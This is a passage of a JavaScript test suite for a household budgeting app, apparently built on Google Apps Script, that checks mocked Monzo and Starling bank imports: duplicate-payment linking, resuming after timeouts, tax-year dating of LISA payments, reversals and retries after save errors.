  G.call({key: G.kE, ops: [{op: "delete", table: "accounts", id: "e-lisa9"}]});
  NOW += 15 * 60000; G.c.bankPoll();
  ok("U5: and taking the LISA off again doesn't bring the payment back beside it", live("moves").length === 1 && live("transactions").length === 0, {mv: live("moves").length, tx: live("transactions").length});
}
{
  // U6: Apps Script gives a gmail account 90 minutes of trigger time a day, and the bank is read 96 times a day for
  // each of you. A read that brings back exactly what the last one did (same payments, same balances, same day, no
  // new settings) doesn't read every tab and save it all again; it still does once an hour, in case something in
  // the sheet changed what it should make of them
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const real = G.c.bankApply_; let applies = 0; G.c.bankApply_ = function () { applies++; return real.apply(this, arguments); };
  NOW += 15 * 60000; G.c.bankPoll(); const a1 = applies;
  NOW += 15 * 60000; G.c.bankPoll();
  const st = G.call({key: G.kE, action: "bank.status"}).bank;
  ok("U6: nothing new from the bank: the save step is skipped, and it still says when it last checked", applies === a1 && st.lastSync === NOW && st.connected && !st.lastError, {applies, a1, st: {lastSync: st.lastSync, NOW, err: st.lastError}});
  monzo.txns.push(mtx("tx_u6", "2026-11-17", -450, {merchant: merchant("Corner Shop", "groceries"), category: "groceries", time: "12:20:00"}));
  NOW += 15 * 60000; G.c.bankPoll();
  ok("U6: a new payment is saved straight away", applies === a1 + 1 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_u6"), applies);
  G.call({key: G.kE, ops: [{op: "put", table: "settings", row: {id: "ethan:bank.rule.corner shop", person: "ethan", key: "bank.rule.corner shop", value: "e-food-b"}}]});
  NOW += 15 * 60000; G.c.bankPoll();
  ok("U6: so is a read after a setting changed", applies === a1 + 2, applies);
  NOW += 15 * 60000; G.c.bankPoll(); NOW += 15 * 60000; G.c.bankPoll(); const a3 = applies;
  NOW += 61 * 60000; G.c.bankPoll();
  ok("U6: and it saves again at least once an hour anyway", a3 === a1 + 2 && applies === a3 + 1, {a3, applies});
  G.c.bankApply_ = real;
}
{
  // U7: Apps Script stops a run at 6 minutes, and nothing after that point happens: not the status, not counting the
  // failure. A first import whose saving is cut off like that every time (too much read in one go) would run every
  // minute for ever, using up the day's trigger time. The next run sees the last one never finished and reads less.
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const big = []; for (let i = 0; i < 1000; i++) big.push(mtx("tx_u7_" + String(i).padStart(4, "0"), B.addDays("2024-01-01", i), -(100 + i), {merchant: merchant("Corner Shop", "general"), category: "general"}));
  monzo.txns = big.concat(monzoData(planned));
  const G = bankEnv(); let killed = false, kills = 0;
  const kill = () => { killed = true; kills++; NOW += 6 * 60000; const e = new Error("Exceeded maximum execution time"); e.killed = true; throw e; };
  const ps0 = G.c.PropertiesService, frozen = (s) => new Proxy(s, {get: (t, k) => (k === "setProperty" || k === "deleteProperty") && killed ? () => {} : t[k]});
  G.c.PropertiesService = {getScriptProperties: () => frozen(ps0.getScriptProperties()), getUserProperties: () => frozen(ps0.getUserProperties())};
  const del0 = G.c.ScriptApp.deleteTrigger; G.c.ScriptApp.deleteTrigger = (t) => killed ? null : del0(t);
  const real = G.c.bankApply_; G.c.bankApply_ = function (p, data) { if (data.txns.length > 400) kill(); return real.apply(this, arguments); };
  const run = (f) => { try { f(); } catch (e) { if (!e.killed) throw e; } finally { killed = false; } };
  run(() => connectMonzo(G));
  let runs = 0, st = {};
  while (runs < 12 && G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports")) { NOW += 60000; runs++; run(() => G.c.bankPendingImports()); }
  st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  const got = grow(G, "transactions").filter(r => /^bk-monzo-tx_u7_/.test(r.id));
  ok("U7: a first import cut off part-way reads less next time and gets there", st.fullDone && got.length === 1000 && new Set(got.map(r => r.id)).size === 1000 && kills <= 3 && !st.runStart, {fullDone: st.fullDone, n: got.length, kills, runs, err: st.lastError});
  G.c.bankApply_ = real; G.c.PropertiesService = ps0; G.c.ScriptApp.deleteTrigger = del0;
}
{
  // U8: an id names one thing, whatever the tab, in every tab: a new payment, move or balance can't take an id another
  // tab uses either (and a new bill can't take a payment's), with the same answer as any other refusal
  const G = bankEnv(t => { t.transactions.push({id: "t-u8-pay", date: "2026-11-01", person: "ethan", amount: 3, budget: "e-fun", account: "e-main"}); });
  const r = G.call({key: G.kS, ops: [
    {op: "put", table: "transactions", row: {id: "e-rent", date: "2026-11-10", person: "sophie", amount: 1, budget: "s-food"}},
    {op: "put", table: "valuations", row: {id: "e-main", account: "s-main", date: "2026-11-10", amount: 1}},
    {op: "put", table: "bills", row: {id: "t-u8-pay", person: "sophie", name: "Odd", amount: 1, account: "s-main", unit: "month", on: "1", start: "2026-12-01"}},
    {op: "put", table: "moves", row: {id: "t-u8-pay", date: "2026-11-10", person: "sophie", from: "s-main", to: "s-rent", amount: 1}},
    {op: "put", table: "transactions", row: {id: "t-u8-mine", date: "2026-11-10", person: "sophie", amount: 1, budget: "s-food"}}
  ]});
  ok("U8: a new row in any tab can't take an id another tab uses (her own new payment still saves)", r.rejected.map(x => x.i).join() === "0,1,2,3" && r.applied.map(x => x.id).join() === "t-u8-mine" && r.rejected.every(x => /can't change that/.test(x.error)), r.rejected);
}

{
  // V1: a card payment shows in Monzo at once, so the bank feed often brings it in before it's logged by hand (or
  // before Peckish posts the shop). The one logged later is linked to it and the bank's copy goes, so it isn't counted
  // twice; one the payer already checked, or one the partner logged, is left alone. And the very next read does it
  // (the read isn't skipped as "nothing new")
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  // (one logged before the bank saw it, but at the wrong amount, so it sits above the bank's copy in the sheet)
  const G = bankEnv(t => { t.transactions.push({id: "app-v1b", date: "2026-11-17", person: "ethan", amount: 5, budget: "e-fun", account: "e-main", note: "Bakery", source: "app"}); });
  connectMonzo(G, {acc_00009main: "e-main"});
  monzo.txns.push(mtx("tx_v1b", "2026-11-17", -800, {merchant: merchant("Bakery Co", "eating_out"), category: "eating_out", time: "12:04:00"}), mtx("tx_v1", "2026-11-17", -1234, {merchant: merchant("Corner Shop", "groceries"), category: "groceries", time: "12:05:00", pending: true}),
    mtx("tx_v1pk", "2026-11-17", -3810, {merchant: merchant("Tesco", "groceries"), category: "groceries", time: "12:06:00"}),
    mtx("tx_v1ok", "2026-11-17", -700, {merchant: merchant("Cafe Nero", "eating_out"), category: "eating_out", time: "12:07:00"}),
    mtx("tx_v1s", "2026-11-17", -910, {merchant: merchant("Boots", "shopping"), category: "shopping", time: "12:08:00"}));
  NOW += 15 * 60000; G.c.bankPoll();
  const live = (id) => grow(G, "transactions").filter(r => (r.id === "bk-monzo-" + id || r.bankId === id) && r.deleted !== true);
  ok("V1: the bank brought them in first", ["tx_v1", "tx_v1pk", "tx_v1ok", "tx_v1s"].every(id => live(id).length === 1 && live(id)[0].id === "bk-monzo-" + id));
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_v1ok", review: false}}]});   // checked already
  G.call({key: G.kE, ops: [
    {op: "put", table: "transactions", row: {id: "app-v1", date: "2026-11-17", person: "ethan", amount: 12.34, budget: "e-food-b", account: "e-main", note: "Corner Shop milk", source: "app"}},
    {op: "put", table: "transactions", row: {id: "peckish-v1", date: "2026-11-17", person: "ethan", amount: 36, budget: "e-food-b", account: "e-main", note: "Tesco (Peckish)", source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "app-v1ok", date: "2026-11-17", person: "ethan", amount: 7, budget: "e-fun", account: "e-main", note: "Cafe Nero", source: "app"}},
    {op: "put", table: "transactions", row: {id: "app-v1b", amount: 8}},
    {op: "put", table: "transactions", row: {id: "app-v1cash", date: "2026-11-17", person: "ethan", amount: 9.1, budget: "e-fun", account: "e-main", note: "Cash for the window cleaner", source: "app"}}]});
  G.call({key: G.kS, ops: [{op: "put", table: "transactions", row: {id: "s-v1", date: "2026-11-17", person: "sophie", amount: 9.1, budget: "s-food", account: "s-main", note: "Boots", source: "app"}}]});
  NOW += 15 * 60000; G.c.bankPoll();
  const hand = (id) => grow(G, "transactions").find(r => r.id === id);
  ok("V1: one logged by hand after the bank had it is linked, and the bank's copy goes", live("tx_v1").length === 1 && live("tx_v1")[0].id === "app-v1" && hand("app-v1").bankId === "tx_v1" && hand("bk-monzo-tx_v1").deleted === true, live("tx_v1"));
  ok("V1: so is a Peckish shop posted later (the bank's amount, still to check)", live("tx_v1pk").length === 1 && hand("peckish-v1").bankId === "tx_v1pk" && hand("peckish-v1").amount === 38.1 && hand("peckish-v1").review === true, live("tx_v1pk"));
  ok("V1: one logged later that doesn't name the same shop (cash of the same amount, say) is its own payment", !hand("app-v1cash").bankId && live("tx_v1s").length === 1 && live("tx_v1s")[0].id === "bk-monzo-tx_v1s");
  ok("V1: one already checked, and the partner's own, are left alone", live("tx_v1ok").length === 1 && live("tx_v1ok")[0].id === "bk-monzo-tx_v1ok" && !hand("app-v1ok").bankId && !hand("s-v1").bankId && live("tx_v1s")[0].id === "bk-monzo-tx_v1s");
  // the hold settles at a different amount: the linked one follows, and the bank's copy stays off
  const h = monzo.txns.find(t => t.id === "tx_v1"); h.settled = iso("2026-11-17", "23:00:00"); h.amount = -1299;
  NOW += 15 * 60000; G.c.bankPoll(); NOW += 61 * 60000; G.c.bankPoll();
  ok("V1: and stays linked when it settles", live("tx_v1").length === 1 && hand("app-v1").amount === 12.99 && hand("bk-monzo-tx_v1").deleted === true, live("tx_v1"));
  ok("V1: the bank's copy below the one you logged doesn't come back either", live("tx_v1b").length === 1 && live("tx_v1b")[0].id === "app-v1b" && hand("bk-monzo-tx_v1b").deleted === true, live("tx_v1b"));
}
{
  // V2: the LISA's £4,000 a year and its bonus go by tax year (6 April to 5 April). A Moneybox payment for a 1 April
  // payday that lands on 6 April is in the new tax year, so it's dated when it landed, not on payday
  freshMonzo(); NOW = RealDate.parse("2027-04-10T12:00:00Z");
  monzo.txns = [mtx("tx_v2pay", "2027-04-01", 240000, {counterparty: {name: "PAYROLL LTD"}, category: "income", time: "06:00:00"}),
    mtx("tx_v2mb", "2027-04-06", -30000, {counterparty: {name: "Moneybox"}, category: "savings", description: "MONEYBOX"}),
    mtx("tx_v2pay0", "2027-03-01", 240000, {counterparty: {name: "PAYROLL LTD"}, category: "income", time: "06:00:00"}),
    mtx("tx_v2mb0", "2027-03-03", -30000, {counterparty: {name: "Moneybox"}, category: "savings", description: "MONEYBOX"})];
  const G = bankEnv(t => { const pay = t.income.find(i => i.id === "e-pay"); pay.on = "1"; });
  connectMonzo(G, {acc_00009main: "e-main"});
  const mb = (id) => grow(G, "moves").find(m => m.id === "bk-monzo-" + id) || {};
  ok("V2: a payday LISA move that lands in the next tax year is dated when it landed", mb("tx_v2mb").key === "pay:2027-04-01:e-lisa" && mb("tx_v2mb").date === "2027-04-06", mb("tx_v2mb"));
  ok("V2: one in the same tax year is still dated on payday", mb("tx_v2mb0").key === "pay:2027-03-01:e-lisa" && mb("tx_v2mb0").date === "2027-03-01", mb("tx_v2mb0"));
  const L = B.lisa(B.load((() => { G.c.CACHE_ = {}; return G.c.allTables_(); })(), "2027-04-10"), "e-lisa", "2027-04-10");
  ok("V2: so it counts towards the new year's allowance", L.paidThisYear === 300, L.paidThisYear);
}
{
  // V3: a Space move or a Moneybox payment the bank later shows as reversed (a payment that bounced): the move the
  // bank feed made from it goes too, so the money isn't counted in the Space or the LISA
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); const feed0 = starling.feed.slice();
  const G = bankEnv(); G.call({key: G.kS, action: "bank.starling.setToken", token: SECRET.starling}); G.call({key: G.kS, action: "bank.map", extId: "goal-savings", account: "s-savings"});
  NOW += 15 * 60000; G.c.bankPoll();
  const gm = () => grow(G, "moves").find(m => m.id === "bk-starling-sfi-goal") || {};
  ok("V3: the Space move came in", gm().amount === 50 && gm().deleted !== true, gm());
  starling.feed = feed0.map(f => f.feedItemUid === "sfi-goal" ? Object.assign({}, f, {status: "REVERSED"}) : f);
  NOW += 15 * 60000; G.c.bankPoll();
  ok("V3: reversed, it goes", gm().deleted === true, gm());
  starling.feed = feed0;
}
{
  // V4: Monzo's description for a payment can be its reference, which whoever pays you (or you) types. Only a pot's
  // id is taken for a pot move: "pot_luck" is a payment, not a move to a pot that isn't there (which dropped it)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = monzoData(planned).concat([mtx("tx_v4", "2026-11-10", -2500, {counterparty: {name: "SAM SMITH"}, description: "pot_luck", category: "general"}),
    mtx("tx_v4pot", "2026-11-11", -1000, {description: "pot_0000AbCdEfGh1234567", category: "savings"})]);
  monzo.pots = monzo.pots.concat([{id: "pot_0000AbCdEfGh1234567", name: "Holiday", balance: 1000, deleted: false}]);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main", pot_0000AbCdEfGh1234567: "e-car"});
  monzo.pots = monzo.pots.filter(x => x.id !== "pot_0000AbCdEfGh1234567");
  ok("V4: a payment whose reference starts pot_ is a payment", (grow(G, "transactions").find(r => r.id === "bk-monzo-tx_v4") || {}).amount === 25);
  ok("V4: a description that is a pot's id is still a pot move", (grow(G, "moves").find(r => r.id === "bk-monzo-tx_v4pot") || {}).to === "e-car");
}
{
  // V5: a Peckish shop the bank linked to a real payment, which Ethan then took off in Budgie: Peckish sending the shop
  // again (or taking it off on its side) doesn't bring the payment back; only Ethan's own Undo does
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = [mtx("tx_v5", "2026-11-14", -4312, {merchant: merchant("ALDI STORES 123", "groceries"), category: "groceries"}), mtx("tx_v5b", "2026-11-15", -2000, {merchant: merchant("Lidl", "groceries"), category: "groceries"})];
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const link = G.call({key: G.kE, action: "app.link", app: "peckish"}).link, pk = JSON.parse(Buffer.from(link.split("#connect=")[1], "base64url").toString()).k;
  const shop = (id, date, amount, note, extra) => ({op: "put", table: "transactions", row: Object.assign({id: id, date: date, person: "ethan", amount: amount, budget: "e-food-b", account: "", split: "", note: note, source: "peckish"}, extra || {})});
  G.call({key: pk, ops: [shop("t-pk-v5", "2026-11-14", 40, "Aldi (Peckish)"), shop("t-pk-v5b", "2026-11-15", 20, "Lidl (Peckish)")]});
  NOW += 60000; G.call({key: G.kE, action: "bank.syncNow"});
  const row = (id) => grow(G, "transactions").find(r => r.id === id) || {};
  ok("V5: linked", row("t-pk-v5").bankId === "tx_v5" && row("t-pk-v5b").bankId === "tx_v5b");
  G.call({key: G.kE, ops: [{op: "delete", table: "transactions", id: "t-pk-v5"}, {op: "delete", table: "transactions", id: "t-pk-v5b"}]});
  const again = G.call({key: pk, ops: [shop("t-pk-v5", "2026-11-14", 40, "Aldi (Peckish)", {deleted: false})]});
  ok("V5: Peckish sending the shop again doesn't bring back a payment Ethan took off", row("t-pk-v5").deleted === true, {again, row: row("t-pk-v5")});
  G.call({key: pk, ops: [{op: "delete", table: "transactions", id: "t-pk-v5b"}]});
  ok("V5: nor does Peckish taking it off on its side", row("t-pk-v5b").deleted === true, row("t-pk-v5b"));
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "t-pk-v5", deleted: false}}]});
  ok("V5: Ethan's own Undo still does", row("t-pk-v5").deleted === false, row("t-pk-v5"));
}
{
  // V6: a change the sheet couldn't save this time (a Google hiccup) is tried again on the next read: that read isn't
  // skipped as "nothing new", and a hold that couldn't be taken off is still watched
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = monzoData(planned).concat([mtx("tx_v6", "2026-11-16", -1500, {merchant: merchant("Corner Shop", "groceries"), category: "groceries", pending: true}),
    mtx("tx_v6h", "2026-11-05", -900, {merchant: merchant("Hotel", "holidays"), category: "holidays", pending: true})]);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const one = monzo.txns.find(t => t.id === "tx_v6"); one.settled = iso("2026-11-17", "08:00:00"); one.amount = -1750;
  monzo.txns = monzo.txns.filter(t => t.id !== "tx_v6h");   // the hold went, more than a week ago
  const real = G.c.applyOne_; let hiccups = 2;
  G.c.applyOne_ = function (p, op) { if (op && op.row && /tx_v6/.test(op.row.id) && hiccups-- > 0) throw new Error("Service Spreadsheets failed"); return real.apply(this, arguments); };
  NOW += 15 * 60000; G.c.bankPoll();
  const r = (id) => grow(G, "transactions").find(x => x.id === id) || {};
  ok("V6: the hiccup", r("bk-monzo-tx_v6").amount === 15 && r("bk-monzo-tx_v6h").deleted !== true && hiccups === 0, [r("bk-monzo-tx_v6").amount, r("bk-monzo-tx_v6h").deleted]);
  NOW += 15 * 60000; G.c.bankPoll();
  ok("V6: the next read, though it brings nothing new, saves what didn't go", r("bk-monzo-tx_v6").amount === 17.5 && r("bk-monzo-tx_v6h").deleted === true, [r("bk-monzo-tx_v6").amount, r("bk-monzo-tx_v6h").deleted]);
  G.c.applyOne_ = real;
}
{
  // V7: a first import read in parts: the part that stopped just after payday saw the pay; the next part, starting
  // there, has a pay-sized payment in two days later. It mustn't take the pay's place (it only looked like the pay
  // because the part that saw the pay was gone)
  freshMonzo(); NOW = RealDate.parse("2027-01-20T12:00:00Z");
  const hist = []; for (let i = 0; i < 99; i++) hist.push(mtx("tx_v7_" + String(i).padStart(3, "0"), B.addDays("2026-09-01", Math.floor(i / 2)), -300, {merchant: merchant("Cafe", "eating_out"), category: "eating_out"}));
  monzo.txns = hist.concat([mtx("tx_v7pay", "2026-10-29", 239000, {counterparty: {name: "PAYROLL LTD"}, category: "income", time: "06:00:00"}),
    mtx("tx_v7big", "2026-10-31", 200000, {counterparty: {name: "OLD SAVINGS CO"}, category: "general"}),
    mtx("tx_v7after", "2026-11-05", -500, {merchant: merchant("Cafe", "eating_out"), category: "eating_out"})]);
  const G = bankEnv(); G.c.BANK_MAX_PAGES_ = 1;   // a page a part, so it stops just after the pay
  connectMonzo(G); let n = 0;
  while (n++ < 6 && G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports")) { NOW += 60000; G.c.bankPendingImports(); }
  const st = JSON.parse(G.env.props.BANK_STATUS_ethan), px = grow(G, "exceptions").find(x => x.id === "x-e-pay-2026-10-29-bank-ethan");
  ok("V7: read in parts", st.fullDone && n > 1 && !st.payCarry && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_v7after"), {n, fullDone: st.fullDone});
  ok("V7: the pay the part before saw keeps its payday", px && px.amount === 2390, px);
  G.c.BANK_MAX_PAGES_ = 300;
}
{
  // V8: the 15-minute read goes through you both in one run, and stops starting new reads halfway through its time. A
  // first import still coming in can take most of that, so it goes last and the other one of you is still read
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); G.call({key: G.kS, action: "bank.starling.setToken", token: SECRET.starling});
  monzo.approved = false; connectMonzo(G); monzo.approved = true;   // Ethan's history hasn't come in yet
  const real = G.c.bankRun_; G.c.bankRun_ = function (p) { const r = real.apply(this, arguments); if (p === "ethan") NOW += 3 * 60000; return r; };
  NOW += 15 * 60000; const t0 = NOW; G.c.bankPoll();
  ok("V8: the one whose history is still coming in doesn't hold up the other's read", JSON.parse(G.env.props.BANK_STATUS_sophie).lastSync === t0 && JSON.parse(G.env.props.BANK_STATUS_ethan).fullDone === true);
  G.c.bankRun_ = real;
}
{
  // V9: after weeks without a read that worked (the bank kept failing, say), the next read goes back further than the
  // usual 35 days, so the payments from the start of the gap aren't lost
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); const feed0 = starling.feed.slice();
  const G = bankEnv(); G.call({key: G.kS, action: "bank.starling.setToken", token: SECRET.starling});
  NOW += 40 * 86400000;
  starling.feed = feed0.concat([sfi("sfi-v9", B.addDays("2026-11-17", 2), 1234, "OUT", {counterPartyName: "Garden Centre", spendingCategory: "HOME"})]);
  const st = JSON.parse(G.env.props.BANK_STATUS_sophie); st.lastSync = NOW - 39 * 86400000; G.env.props.BANK_STATUS_sophie = JSON.stringify(st);
  G.c.bankPoll();
  ok("V9: a payment from the start of a long gap still comes in", grow(G, "transactions").some(r => r.id === "bk-starling-sfi-v9"));
  starling.feed = feed0;
}
{
  // W1: £20 to a friend two days before the £20 phone bill. The bill is the payment most like it (the nearer day, or
  // the same name), so the friend's £20 comes in as a payment and the bill's own payment doesn't (before, the friend's
  // came first in date order, was taken for the bill and lost, and the bill came in as spending)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = [mtx("tx_w1friend", "2026-11-03", -2000, {counterparty: {name: "SAM SMITH"}, category: "general"}),
    mtx("tx_w1dd", "2026-11-05", -2000, {counterparty: {name: "EE LIMITED"}, description: "EE LIMITED", category: "bills"}),
    mtx("tx_w1pal", "2026-12-02", -2000, {counterparty: {name: "ALEX JONES"}, category: "general"}),
    mtx("tx_w1card", "2026-12-04", -2000, {merchant: merchant("Phone Co", "bills"), category: "bills"})];
  NOW = RealDate.parse("2026-12-10T12:00:00Z");
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const ids = grow(G, "transactions").filter(r => /^bk-/.test(r.id) && r.deleted !== true).map(r => r.id).sort();
  ok("W1: a payment of the same amount just before a bill isn't taken for it", ids.join() === "bk-monzo-tx_w1friend,bk-monzo-tx_w1pal", ids);
  NOW = RealDate.parse("2026-11-17T12:00:00Z");
}
{
  // W2: Ethan checks the bank's Tesco payment as food straight away, then logs the shop in Peckish, which posts it. It's
  // the same shop: linked, keeping what he said it was for, and the bank's copy goes, so the food budget doesn't count
  // it twice. One checked as something else, or one he logs by hand after checking (cash, more likely), stays its own
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  monzo.txns.push(mtx("tx_w2", "2026-11-17", -3810, {merchant: merchant("Tesco", "groceries"), category: "groceries", time: "11:01:00"}),
    mtx("tx_w2fun", "2026-11-17", -2400, {merchant: merchant("Lidl", "groceries"), category: "groceries", time: "11:02:00"}),
    mtx("tx_w2hand", "2026-11-17", -450, {merchant: merchant("Greggs", "eating_out"), category: "eating_out", time: "11:03:00"}));
  NOW += 15 * 60000; G.c.bankPoll();
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_w2", budget: "e-food-b", split: "half", review: false}},
    {op: "put", table: "transactions", row: {id: "bk-monzo-tx_w2fun", budget: "e-fun", review: false}},
    {op: "put", table: "transactions", row: {id: "bk-monzo-tx_w2hand", budget: "e-fun", review: false}}]});
  const pk = JSON.parse(Buffer.from(G.call({key: G.kE, action: "app.link", app: "peckish"}).link.split("#connect=")[1], "base64url").toString()).k;
  const shop = (id, amount, note) => ({op: "put", table: "transactions", row: {id: id, date: "2026-11-17", person: "ethan", amount: amount, budget: "e-food-b", account: "", split: "", note: note, source: "peckish"}});
  G.call({key: pk, ops: [shop("t-pk-w2", 36, "Tesco (Peckish)"), shop("t-pk-w2fun", 24, "Lidl (Peckish)")]});
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "app-w2hand", date: "2026-11-17", person: "ethan", amount: 4.5, budget: "e-fun", account: "e-main", note: "Greggs", source: "app"}}]});
  NOW += 15 * 60000; G.c.bankPoll();
  const r = (id) => grow(G, "transactions").find(x => x.id === id) || {};
  const live = (id) => grow(G, "transactions").filter(x => (x.id === "bk-monzo-" + id || x.bankId === id) && x.deleted !== true).map(x => x.id);
  ok("W2: a Peckish shop posted after the bank's copy was checked as food is linked to it", live("tx_w2").join() === "t-pk-w2" && r("bk-monzo-tx_w2").deleted === true && r("t-pk-w2").amount === 38.1, live("tx_w2"));
  ok("W2: and keeps what Ethan said it was for", r("t-pk-w2").review === false && r("t-pk-w2").budget === "e-food-b" && r("t-pk-w2").split === "half", r("t-pk-w2"));
  ok("W2: one checked as something else, or logged by hand after checking, is left as it is", live("tx_w2fun").join() === "bk-monzo-tx_w2fun" && !r("t-pk-w2fun").bankId && live("tx_w2hand").join() === "bk-monzo-tx_w2hand" && !r("app-w2hand").bankId);
}
{
  // W3: linking one logged after the bank had it is two writes (link it, take the bank's copy off). If the sheet can't
  // make the second, the next read takes the bank's copy off, so the payment isn't counted twice for good
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  monzo.txns.push(mtx("tx_w3", "2026-11-17", -1234, {merchant: merchant("Corner Shop", "groceries"), category: "groceries", time: "11:05:00"}));
  NOW += 15 * 60000; G.c.bankPoll();
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "app-w3", date: "2026-11-17", person: "ethan", amount: 12.34, budget: "e-food-b", account: "e-main", note: "Corner Shop", source: "app"}}]});
  const real = G.c.applyOne_; let hic = 1;
  G.c.applyOne_ = function (p, op) { if (op && op.row && op.row.id === "bk-monzo-tx_w3" && op.row.deleted && hic-- > 0) throw new Error("Service Spreadsheets failed"); return real.apply(this, arguments); };
  NOW += 15 * 60000; G.c.bankPoll();
  const live = () => grow(G, "transactions").filter(r => (r.id === "bk-monzo-tx_w3" || r.bankId === "tx_w3") && r.deleted !== true).map(r => r.id);
  ok("W3: the write that didn't go", hic === 0 && live().length === 2, live());
  NOW += 15 * 60000; G.c.bankPoll();
  G.c.applyOne_ = real;
  ok("W3: the next read leaves one row for the payment", live().join() === "app-w3", live());
}
{
  // W4: a second move into the bills pot the same week, of about the planned amount: it's a move of its own, not lost
  // as "already ticked" (in a later read), nor counted as one with the payday tick (in the same read)
  freshMonzo(); NOW = RealDate.parse("2026-11-03T12:00:00Z"); monzo.txns = monzoData(planned).filter(t => t.created < "2026-11-03");
  monzo.txns.push(mtx("tx_w4same", "2026-10-31", -Math.round(planned.food * 100), {description: "pot_food", category: "savings", metadata: {pot_id: "pot_food"}}));
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main", pot_bills: "e-bills", pot_food: "e-food"});
  monzo.txns.push(mtx("tx_w4", "2026-11-03", -Math.round(planned.bills * 100), {description: "pot_bills", category: "savings", metadata: {pot_id: "pot_bills"}, time: "11:00:00"}));
  NOW += 15 * 60000; G.c.bankPoll();
  const mv = (id) => grow(G, "moves").find(m => m.id === "bk-monzo-" + id) || {};
  ok("W4: a second payday-sized move in a later read comes in", mv("tx_w4").to === "e-bills" && mv("tx_w4").key === "bank:tx_w4" && mv("tx_potbills").key === "pay:2026-10-29:e-bills", [mv("tx_w4"), mv("tx_potbills").key]);
  ok("W4: and one in the same read isn't counted as the same tick", mv("tx_w4same").key === "bank:tx_w4same" && mv("tx_potfood").key === "pay:2026-10-29:e-food", [mv("tx_w4same").key, mv("tx_potfood").key]);
  const dups = B.load((() => { G.c.CACHE_ = {}; return G.c.allTables_(); })(), "2026-11-03").moves.filter(m => m.dup).map(m => m.id);
  ok("W4: so both reach the pot (neither is set aside as a copy)", dups.length === 0, dups);
}
{
  // W5: a first import in parts, where the part after the pay is only a day or two long: the part after that still
  // weighs the pay the first part saw, so a pay-sized payment in a few days later can't take its place
  freshMonzo(); NOW = RealDate.parse("2027-01-20T12:00:00Z");
  const hm = (i) => String(10 + Math.floor(i / 60)).padStart(2, "0") + ":" + String(i % 60).padStart(2, "0") + ":00";
  const hist = []; for (let i = 0; i < 99; i++) hist.push(mtx("tx_w5a" + String(i).padStart(3, "0"), B.addDays("2026-09-01", Math.floor(i / 2)), -300, {merchant: merchant("Cafe", "eating_out"), category: "eating_out"}));
  const mid = []; for (let i = 0; i < 100; i++) mid.push(mtx("tx_w5b" + String(i).padStart(3, "0"), i < 50 ? "2026-10-29" : "2026-10-30", -200, {merchant: merchant("Shop", "shopping"), category: "shopping", time: hm(i)}));
  monzo.txns = hist.concat([mtx("tx_w5pay", "2026-10-29", 239000, {counterparty: {name: "PAYROLL LTD"}, category: "income", time: "06:00:00"})], mid,
    [mtx("tx_w5big", "2026-11-01", 200000, {counterparty: {name: "OLD SAVINGS CO"}, category: "general"}), mtx("tx_w5after", "2026-11-05", -500, {merchant: merchant("Cafe", "eating_out"), category: "eating_out"})]);
  const G = bankEnv(); G.c.BANK_MAX_PAGES_ = 1;
  connectMonzo(G); let n = 0;
  while (n++ < 8 && G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports")) { NOW += 60000; G.c.bankPendingImports(); }
  const st = JSON.parse(G.env.props.BANK_STATUS_ethan), px = grow(G, "exceptions").find(x => x.id === "x-e-pay-2026-10-29-bank-ethan");
  ok("W5: read in three parts or more", st.fullDone && n > 2 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_w5after"), {n, fullDone: st.fullDone});
  ok("W5: the pay keeps its payday across a short part", px && px.amount === 2390, px);
  G.c.BANK_MAX_PAGES_ = 300;
}
{
  // X1: two Tesco trips three days apart, Monday's already checked as food. Thursday's shop, posted by Peckish, is
  // Thursday's payment, whether the bank brings that in the same read or had it already: Monday's checked payment
  // isn't moved onto it (before, it came first in date order and took the shop, its amount and its date)
  const run = (thuFirst) => {
    freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
    const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
    monzo.txns.push(mtx("tx_x1mon", "2026-11-14", -1200, {merchant: merchant("Tesco", "groceries"), category: "groceries"}));
    NOW += 15 * 60000; G.c.bankPoll();
    G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_x1mon", budget: "e-food-b", split: "half", review: false}}]});
